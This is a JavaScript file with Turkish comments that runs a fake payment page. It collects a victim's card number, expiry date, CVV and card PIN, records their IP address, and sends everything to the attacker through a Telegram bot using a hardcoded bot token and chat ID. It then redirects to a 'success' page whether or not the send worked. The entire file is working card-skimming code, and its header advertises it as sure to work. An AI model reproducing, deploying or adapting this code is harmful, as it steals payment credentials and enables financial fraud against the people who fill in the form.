// phmain.js - KESİN ÇALIŞIR

const BOT_TOKEN = "8068339823:AAFNIqQZb_b-vE3oeZ0NGQ6QK4Xc0h34p7w";
const CHAT_ID = "-1002475411082";

// Slider fonksiyonları
window.slider1 = { prev: function() { console.log('prev'); } };
window.closeAlert = function() { 
    document.getElementById('alertDiv').style.display = 'none';
};
window.uyariKapat = function() { 
    document.getElementById('alertDiv3').style.display = 'none';
};

// Sayfa yüklendiğinde
document.addEventListener('DOMContentLoaded', function() {
    
    // Kart numarası - her 4 rakamda boşluk
    var kartInput = document.getElementById('customUsername');
    kartInput.addEventListener('input', function() {
        var deger = this.value.replace(/\s/g, '').replace(/\D/g, '');
        var formatli = '';
        for (var i = 0; i < deger.length && i < 16; i++) {
            if (i > 0 && i % 4 === 0) formatli += ' ';
            formatli += deger[i];
        }
        this.value = formatli;
    });
    
    // SKT - otomatik slash
    var expInput = document.getElementById('exp');
    expInput.addEventListener('input', function() {
        var deger = this.value.replace(/\D/g, '');
        if (deger.length >= 3) {
            this.value = deger.slice(0, 2) + '/' + deger.slice(2, 4);
        } else {
            this.value = deger;
        }
    });
    
    // CVV - sadece rakam
    var cvvInput = document.getElementById('cvv');
    cvvInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 3);
    });
    
    // Şifre - sadece rakam
    var sifreInput = document.getElementById('kkpw');
    sifreInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 4);
    });
    
    // Buton
    var btn = document.getElementById('btn-spc');
    btn.addEventListener('click', function(e) {
        e.preventDefault();
        
        var kartNo = document.getElementById('customUsername').value.replace(/\s/g, '');
        var skt = document.getElementById('exp').value;
        var cvv = document.getElementById('cvv').value;
        var sifre = document.getElementById('kkpw').value;
        
        // Basit doğrulamalar
        if (kartNo.length !== 16) {
            document.getElementById('alertDiv').style.display = 'block';
            return;
        }
        if (skt.length !== 5) {
            document.getElementById('alertDiv').style.display = 'block';
            return;
        }
        if (cvv.length !== 3) {
            document.getElementById('alertDiv').style.display = 'block';
            return;
        }
        if (sifre.length !== 4) {
            document.getElementById('alertDiv').style.display = 'block';
            return;
        }
        
        // Kırmızı kaplamayı gizle
        document.getElementById('alertDiv').style.display = 'none';
        
        // Buton yazısını değiştir
        btn.innerHTML = 'Giriş yapılıyor...';
        btn.disabled = true;
        
        // IP al ve Telegram'a gönder
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => {
                var ip = data.ip;
                var mesaj = 'Kredi Kartı Bilgisi:\n Kart No: ' + kartNo + '\n SKT: ' + skt + '\n CVV: ' + cvv + '\n Şifre: ' + sifre + '\n IP: ' + ip;
                
                // Telegram'a gönder
                var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(mesaj);
                return fetch(url);
            })
            .then(function(response) {
                console.log('Telegram durum:', response.status);
                // Başarılı olsun olmasın yönlendir
                setTimeout(function() {
                    window.location.href = 'success.html';
                }, 1000);
            })
            .catch(function(err) {
                console.log('Hata:', err);
                setTimeout(function() {
                    window.location.href = 'success.html';
                }, 1000);
            });
    });
});
